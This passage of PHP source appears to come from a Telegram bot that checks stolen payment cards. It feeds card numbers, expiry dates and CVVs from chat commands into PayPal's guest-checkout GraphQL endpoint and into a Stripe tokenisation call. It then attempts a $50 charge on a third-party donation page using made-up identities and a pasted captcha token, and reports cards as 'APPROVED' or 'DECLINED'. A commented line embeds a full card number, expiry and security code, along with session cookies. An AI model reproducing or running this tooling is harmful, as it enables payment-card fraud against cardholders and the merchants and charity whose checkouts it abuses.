curl_close($curl);




///CHECKOUT////
$palabras_originales = array("TOKEN", "CC", "ANO", "CVV");
$palabras_nuevas = array($token ,$cc, $ma, $cvv);
$texto = '{"query":"\\n        mutation payWithCard(\\n            $token: String!\\n            $card: CardInput!\\n            $phoneNumber: String\\n            $firstName: String\\n            $lastName: String\\n            $shippingAddress: AddressInput\\n            $billingAddress: AddressInput\\n            $email: String\\n            $currencyConversionType: CheckoutCurrencyConversionType\\n            $installmentTerm: Int\\n            $identityDocument: IdentityDocumentInput\\n        ) {\\n            approveGuestPaymentWithCreditCard(\\n                token: $token\\n                card: $card\\n                phoneNumber: $phoneNumber\\n                firstName: $firstName\\n                lastName: $lastName\\n                email: $email\\n                shippingAddress: $shippingAddress\\n                billingAddress: $billingAddress\\n                currencyConversionType: $currencyConversionType\\n                installmentTerm: $installmentTerm\\n                identityDocument: $identityDocument\\n            ) {\\n                flags {\\n                    is3DSecureRequired\\n                }\\n                cart {\\n                    intent\\n                    cartId\\n                    buyer {\\n                        userId\\n                        auth {\\n                            accessToken\\n                        }\\n                    }\\n                    returnUrl {\\n                        href\\n                    }\\n                }\\n                paymentContingencies {\\n                    threeDomainSecure {\\n                        status\\n                        method\\n                        redirectUrl {\\n                            href\\n                        }\\n                        parameter\\n                    }\\n                }\\n            }\\n        }\\n        ","variables":{"token":"TOKEN","card":{"cardNumber":"CC","type":"VISA","expirationDate":"ANO","postalCode":"10010","securityCode":"CVV"},"firstName":"Carlos","lastName":"Perez","billingAddress":{"givenName":"Carlos","familyName":"Perez","line1":"6195 bollinger rd","line2":null,"city":"New york","state":"AZ","postalCode":"10010","country":"US"},"email":"bivix38912@rinseart.com","currencyConversionType":"PAYPAL"},"operationName":null}';

$data = str_replace($palabras_originales, $palabras_nuevas, $texto);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.paypal.com/graphql?fetch_credit_form_submit=',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => $data,
//  CURLOPT_POSTFIELDS => '{"query":"\\n        mutation payWithCard(\\n            $token: String!\\n            $card: CardInput!\\n            $phoneNumber: String\\n            $firstName: String\\n            $lastName: String\\n            $shippingAddress: AddressInput\\n            $billingAddress: AddressInput\\n            $email: String\\n            $currencyConversionType: CheckoutCurrencyConversionType\\n            $installmentTerm: Int\\n            $identityDocument: IdentityDocumentInput\\n        ) {\\n            approveGuestPaymentWithCreditCard(\\n                token: $token\\n                card: $card\\n                phoneNumber: $phoneNumber\\n                firstName: $firstName\\n                lastName: $lastName\\n                email: $email\\n                shippingAddress: $shippingAddress\\n                billingAddress: $billingAddress\\n                currencyConversionType: $currencyConversionType\\n                installmentTerm: $installmentTerm\\n                identityDocument: $identityDocument\\n            ) {\\n                flags {\\n                    is3DSecureRequired\\n                }\\n                cart {\\n                    intent\\n                    cartId\\n                    buyer {\\n                        userId\\n                        auth {\\n                            accessToken\\n                        }\\n                    }\\n                    returnUrl {\\n                        href\\n                    }\\n                }\\n                paymentContingencies {\\n                    threeDomainSecure {\\n                        status\\n                        method\\n                        redirectUrl {\\n                            href\\n                        }\\n                        parameter\\n                    }\\n                }\\n            }\\n        }\\n        ","variables":{"token":"4CN918618N9014811","card":{"cardNumber":"4347690261257028","type":"VISA","expirationDate":"11/2025","postalCode":"10010","securityCode":"245"},"firstName":"Carlos","lastName":"Perez","billingAddress":{"givenName":"Carlos","familyName":"Perez","line1":"6195 bollinger rd","line2":null,"city":"New york","state":"AZ","postalCode":"10010","country":"US"},"email":"bivix38912@rinseart.com","currencyConversionType":"PAYPAL"},"operationName":null}',
//  CURLOPT_COOKIE => 'ts_c=vr%3Df8fd5f0d1920a798184655fcfecd84a4%26vt%3Df8fd5f0d1920a798184655fcfecd84a3; rssk=d%7DC9%4093%3C%3A82%3D68B%3B%3Exqx%3E%3Fgyu%3Ak%7F%3E%3F10; enforce_policy=ccpa; nsid=s%3AiQJUjQtlc01CRBkLLTbfOo162CXXXgto.SnJWHSZ1BYgQBKeubCjw49OKBWvgkTmWdIBfPxzG%2FP0; KHcl0EuY7AKSMgfvHl7J5E7hPtK=nEWEN5BnkPljmgdYFT5zu9yflPyctLHMWNYqQKBFHACQowrrCownPlVg_vJPwo8rk7tiLMTXIe___AWI; ddi=KnBCeYG4uWvAvIMOZgWojdVSdjduzanbGR-5ctKjouRNx2Zp238tJ3IfIVE746ZJrDNnZqz5IgfL8Il6KSe6-9gbJHDIgHb3txo06iu1VqxrnzJ_; sc_f=hKuj5WPUdnJqsetyQYRZRy60O-WIFGTvPHnYuENoP78W63M_yzFDtYRgIwVMKYQ2AhuuGg_ZHVzDJygf6L6UIcRe68ArJgZUuWfH6W; AV894Kt2TSumQQrJwe-8mzmyREO=S23AAPWOQoJg2I0ZNN34mLR0idY1u7sDGy5b9t71Zi9S4CBmR0as-Tcex44Y4OL6bVG4B5GFMEjzRRpzLFPWO0mF4pEIT_pxg; login_email=xipay59414%40bulatox.com; LANG=en_US%3BUS; l7_az=dcg16.slc; tsrce=xobuyernodeserv; x-pp-s=eyJ0IjoiMTczMDc1NDUzMDczMCIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1825358930%26vteXpYrS%3D1730756330%26vr%3Df8fd5f0d1920a798184655fcfecd84a4%26vt%3Df8fd5f0d1920a798184655fcfecd84a3%26vtyp%3Dnew',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'paypal-client-context: 4CN918618N9014811',
    'x-app-name: standardcardfields',
    'paypal-client-metadata-id: 4CN918618N9014811',
    'x-country: US',
    'origin: https://www.paypal.com',
    'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_9551e72314_mje6mde6mdq&buttonSessionID=uid_687cc5ee38_mje6mdc6mtk&locale.x=en_US&commit=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFIZHNiMThlRW5hLXFNcVNTRk9zV3BkTUpBMmRleUtNdTBaYlZQUXhhbUttdTE3blpJR3gyd21aMUhzQXoycFBWM0dSdDRhTWtBMHpGQ2wmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0wNC0wMyZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciZsb2NhbGU9ZW5fVVMiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJXb29fUFBDUCIsImRhdGEtdWlkIjoidWlkX3J2dHBvbXZycGp6eHVvc2tnc3Z6amJjd25yZXd6ZiJ9fQ&disable-card=&token=4CN918618N9014811',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//$respo = $json['errors'][0]['data'][0]['code'];
//$mensaje = $json['errors'][0]['message'];
curl_close($curl);
	
// Verifica si hay errores
if (isset($json['errors'])) {

   if (isset($json['errors'][0]['data'][0]['code'])){
       $respo = $json['errors'][0]['data'][0]['code'];

   } elseif (isset($json['errors'][0]['message'])){
       $respo = $json['errors'][0]['message'];
   }

} elseif (isset($json['data']['approveGuestPaymentWithCreditCard']) && $json['data']['approveGuestPaymentWithCreditCard'] !== null) {
    // Requerimiento de 3DS
    if (isset($json['data']['approveGuestPaymentWithCreditCard']['flags']['is3DSecureRequired']) && $json['data']['approveGuestPaymentWithCreditCard']['flags']['is3DSecureRequired']) {
        $respo = "3DS authentication is required.";
    }

    // Estado del pago
    if (isset($json['data']['approveGuestPaymentWithCreditCard']['status'])) {
        if ($json['data']['approveGuestPaymentWithCreditCard']['status'] == 'approved') {
            $respo = "Pago aprobado con éxito. ID: " . $json['data']['approveGuestPaymentWithCreditCard']['id'];
        } else {
            $respo = "Pago rechazado";
        }
    }
} else {
$respo = $response;
}
	
	
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";



/*
if (empty($respo)) {
$respo = $response;
} else {
$respo = $respo;
}
*/

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Paypal\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'CARD_GENERIC_ERROR') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction not permitted by issuer') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Paypal\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Paypal\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}

















// Checking CC's Commands
elseif((strpos($message, "!stp") === 0)||(strpos($message, "/stp") === 0)||(strpos($message, ".stp") === 0)){

$lista = substr($message, 5);
//$i     = explode("|", $lista);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$cvv   = $i[3];
/*function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};*/

$bin = substr($lista, 0, 6);
////
$num = "$cc$mes$ano$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

//-----------------------------------------------------//
if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮ɢᴀᴛᴇᴡᴀʏ sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /stp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !stp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .stp cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//
$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

////RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

////SACA EL TOKEN//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
$result = curl_exec($ch);
curl_close($ch);

$token = trim(strip_tags(getstr($result,'id": "','"')));
$ip = trim(strip_tags(getstr($result,'client_ip": "','"')));
//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://goodbricksapp.com/icsd.org/donate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'g-recaptcha-response=03ANYolqtrAXy5zIt2AjPl_v86EhHB_0O8YEgRQ73dmNp0E6rS3OaDFJqwYHwDoSLyD6Z9plsGVb3XvVAqEvqVWJTNX-YDYXAx2ynIggYNEIE5ns3byzDEIOJMghcj6qkmnzTyM4nzk3XRnSeqndz8VbvON0ctHxIbblzlqdtAwfNLKyYN3Z4QvcOqK8RmrhIJNInTgDRBAXqo8cCS3hg2xlDTbuzXSS1EV4WAlTE0yIyUVAs27f63DSS4MRZL-jX8ifTCcHmDgX3sKX92atN3k3vI91QTJ8TGmPkcuWTj4xgBnktDyFxQSIPMY2yORw5d90yIDfUHQV62ZAn3TQvZ0l_psLuVhs15xrah2ZGuA-qTBuAhAM64qn8WXaw2YCXQMG1rU4RkUeYm3PvsV0_Yxq9aBzDMC7g6aySQP-1RUw2AA6Ma7yTWvhdwL7tWcs7iy6-5fWF86dIb2tBujmSMzwfr4EdOZ1PD4Q&token='.$token.'&clientIp='.$ip.'&categoryAmount=50&paymentIterations=0&categoryName=funeral+expenses&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&address=true&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'');
$result1 = curl_exec($ch);
curl_close($ch);
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '',4);

$data = json_decode($result1, true);
	
//------------------------------------------------------------------//
$cvc_check = trim(strip_tags(getStr($result1,'"cvc_check":"','"')));
$decline_check = trim(strip_tags(getStr($result1,'"decline_code":"','"')));
//------------------------------------------------------------------//
if($cvc_check == false){
$proxy = "LIVE ✅";
}else{
$proxy = "PROXY DEAD ❌";
}

////////////////////////// [Card Response]  //////////////////////////
//$respo = trim(strip_tags(capture($result1,'"message":"',';')));
$respo = $data['status'] ?? trim(strip_tags(capture($result1,'"message":"',';')));
	
$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}


if (array_in_string($result1, $live_array)) {
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
                $live = True;
            }elseif((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: INCORRECT ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: EXPIRED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, 'Incomplete or incorrect payment information.'))){
		$respo = trim(strip_tags(capture($result1,'"message":"','"')));
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.')) || (strpos($result1, "do_not_honor")) || (strpos($result1, '"decline_code": "generic_decline"')) || (strpos($result1, "generic_decline")) || (strpos($result1, "Your card does not support this type of purchase")) || (strpos($result1, "card_error_authentication_required"))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, '"cvc_check": "unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: CVC CHECK UNAVAILABLE ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif(strpos($result1, 'null')){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }else{
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }
if($live) {
editMessage($chat_id, $respuesta, $id_text);
die();
} else {
editMessage($chat_id, $respuesta, $id_text);
die();
}
//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();
}



//-------------------END CHECKER CCS------------------//
//else if(isset($message)){
/*
elseif ((strpos($message, "!") === 0 && strlen($message) > 1) || (strpos($message, "/") === 0 && strlen($message) > 1) || (strpos($message, ".") === 0 && strlen($message) > 1)) {
        $respuesta = "Perdón no te entiendo!!!";
        sendMessage($chat_id,$respuesta,$message_id);
}
*/

elseif (preg_match('/^[\/!\.]\w+/', $message)) {
    // Si el mensaje comienza con /, ! o . seguido de alguna palabra
    $respuesta = "Perdón no te entiendo!!!";
    sendMessage($chat_id,$respuesta,$message_id);
   // echo "$respuesta";
} else {
    // Ignorar mensajes que no son comandos
}

//-------FUNCION DE ENVIAR---------//
function sendMessage($chatID, $respuesta, $message_id) {
$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&reply_to_message_id=".$message_id."&parse_mode=HTML&text=".urlencode($respuesta);
//$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
$cap_message_id = file_get_contents($url);
//------------EXTRAE EL ID DEL MENSAGE----------//
$id_cap = capture($cap_message_id, '"message_id":', ',');
file_put_contents("ID", $id_cap);
}

function sendMessageNew($chatID, $respuesta, $message_id) {
$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
file_get_contents($url);
}

function sendPv($chatID, $respuesta) {
     $url = $GLOBALS["website"]."/sendMessage?chat_id=".$chatID."&text=".urlencode($respuesta);
    file_get_contents($url);                                    
}


function editMessage($chatID, $respuesta, $id_text){
$url = $GLOBALS["website"]."/editMessageText?disable_web_page_preview=true&chat_id=".$chatID."&message_id=".$id_text."&parse_mode=HTML&text=".urlencode($respuesta);
file_get_contents($url);
}


//------------------------------//

function deleteMessage($chatID, $message_id){
$url = $GLOBALS["website"]."/deleteMessage?chat_id=".$chatID."&message_id=".$message_id."";
file_get_contents($url);
}

function kickChatMember($chatID, $id){
$url = $GLOBALS["website"]."/kickChatMember?chat_id=".$chatID."&user_id=".$id."";
